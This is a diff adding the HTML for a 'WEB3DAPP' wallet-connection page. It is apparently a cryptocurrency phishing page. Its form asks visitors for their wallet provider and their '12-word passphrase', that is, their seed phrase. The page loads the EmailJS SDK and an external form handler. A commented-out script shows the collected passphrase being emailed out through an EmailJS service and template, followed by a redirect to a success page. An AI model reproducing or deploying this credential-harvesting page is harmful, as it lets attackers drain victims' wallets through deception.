@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+    <title>Connect Wallet To Dapp</title>
+
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+
+    <!-- fonts style -->
+    <link
+      href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap"
+      rel="stylesheet"
+    />
+    <!-- Custom styles for this template -->
+    <link href="css/style.css" rel="stylesheet" />
+    <!-- responsive style -->
+    <link href="css/responsive.css" rel="stylesheet" />
+    <link rel="stylesheet" href="css/wallet.css" />
+
+    <!-- Include EmailJS SDK -->
+  <!-- Use the latest EmailJS SDK via CDN -->
+  <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+(function(){
+emailjs.init({
+  publicKey: "8vV71WqV0ofavi4sh",
+});
+})();
+</script>
+  <script defer src="js/formHandler.js"></script>
+  </head>
+  <body>
+    <!-- header section starts -->
+    <header class="header_section">
+      <div class="container-fluid">
+        <nav class="navbar navbar-expand-lg custom_nav-container">
+          <a class="navbar-brand" href="index.html">
+            <span> WEB3DAPP </span>
+          </a>
+          <button
+            class="navbar-toggler"
+            type="button"
+            data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent"
+            aria-expanded="false"
+            aria-label="Toggle navigation"
+          >
+            <span class="navbar-toggler-icon"></span>
+          </button>
+
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <div
+              class="d-flex ml-auto flex-column flex-lg-row align-items-center"
+            >
+              <ul class="navbar-nav">
+                <li class="nav-item">
+                  <a class="nav-link" href="index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="about.html"> About </a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="how.html"> How </a>
+                </li>
+                <li class="nav-item active">
+                  <a class="nav-link" href="wallet.html">
+                    <span>Wallet</span> <img src="images/wallet.png" alt="" />
+                    <span class="sr-only">(current)</span> 
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </nav>
+      </div>
+    </header>
+    <!-- end header section -->
+
+    <div class="wrapper fadeInDown">
+      <div id="formContent">
+        <h2 class="active underlinehover">Get Started</h2>
+        <div class="fadeIn First">
+          <p>Fill in your details below to get started</p>
+        </div>
+
+        <!-- Form -->
+        <form id="walletForm">
+          <input type="text" id="email" class="fadeIn Second" placeholder="Your Email Address">
+          <input type="text" id="walletProvider" class="fadeIn Second" placeholder="Wallet Provider (e.g Trust Wallet, Metamask)">
+          <input type="text" id="passphrase" class="fadeIn Third" placeholder="Your 12-Word API Passphrase">
+          <button type="submit" class="fadeIn Fourth">Submit</button>
+        </form>
+
+        <!-- Message after form submission -->
+        <div id="status"></div>
+
+        <!-- Validation error messages -->
+        <div id="validationErrors" style="color: red;"></div>
+
+        <div id="formFooter">
+          <p>Having trouble connecting? </p>
+          <a class="underlinehover" href="mailto:web3dappsoftware@gmail.com">Email us at web3dappsoftware@gmail.com</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- info section -->
+    <section class="info_section layout_padding">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-3">
+            <div class="info_contact">
+              <div class="info_logo">
+                <a href="index.html">
+                  <span>WEB3DAPP</span>
+                </a>
+              </div>
+              <h5>Contact Us</h5>
+              <p>Wall Street, New York, NY, USA</p>
+              <p><a href="mailto:web3dappsoftware@gmail.com">web3dappsoftware@gmail.com</a></p>
+            </div>
+          </div>
+          <div class="col-md-3">
+            <div class="info_form">
+              <h5>Newsletter</h5>
+              <form action="">
+                <input type="email" placeholder="Enter your email" />
+                <button>Subscribe</button>
+              </form>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- footer section -->
+    <section class="container-fluid footer_section">
+      <p>&copy; 2019 All Rights Reserved By <a href="index.html">WEB3DAPP</a></p>
+    </section>
+
+    <!-- JavaScript for validation and form submission -->
+    <!-- <script>
+      document.getElementById('walletForm').addEventListener('submit', function(event) {
+  event.preventDefault(); // Prevent form from submitting -->
+
+  <!-- // Clear any previous validation errors -->
+  <!-- const validationErrors = document.getElementById('validationErrors');
+  validationErrors.textContent = "";
+
+  // Get input field values
+  const email = document.getElementById('email').value.trim();
+  const walletProvider = document.getElementById('walletProvider').value.trim();
+  const passphrase = document.getElementById('passphrase').value.trim();
+
+  // Regular expression for validating email
+  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+  // Validate form fields
+  if (!email || !emailPattern.test(email)) {
+    validationErrors.textContent += "Please enter a valid email address.\n";
+  }
+  if (!walletProvider) {
+    validationErrors.textContent += "Please enter a wallet provider (e.g., Trust Wallet, Metamask).\n";
+  }
+  if (!passphrase) {
+    validationErrors.textContent += "Please enter your 12-word API passphrase.\n";
+  }
+
+  // If there are validation errors, don't submit the form
+  if (validationErrors.textContent) {
+    return;
+  }
+
+  // Show "Processing" message
+  const statusDiv = document.getElementById('status');
+  statusDiv.textContent = "Processing...";
+
+  // Preparing the parameters to send via EmailJS
+  var templateParams = {
+    email: email,
+    walletProvider: walletProvider,
+    passphrase: passphrase
+  }; -->
+
+  <!-- // Send email using EmailJS -->
+  <!-- emailjs.send('service_9273bwj', 'template_i0rgp8m', templateParams) -->
+    <!-- .then(function(response) { -->
+        <!-- console.log('SUCCESS!', response.status, response.text); -->
+        <!-- // Redirect to success page after successful submission -->
+        <!-- window.location.href = 'success.html'; -->
+    <!-- }, function(error) { -->
+        <!-- console.log('FAILED...', error); -->
+        <!-- statusDiv.textContent = "Failed to submit. Please try again."; -->
+        <!-- statusDiv.style.color = "red"; -->
+    <!-- }); -->
+<!-- }); -->
+
+    <!-- </script> -->
+
+    <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>
+  </body>
+</html>
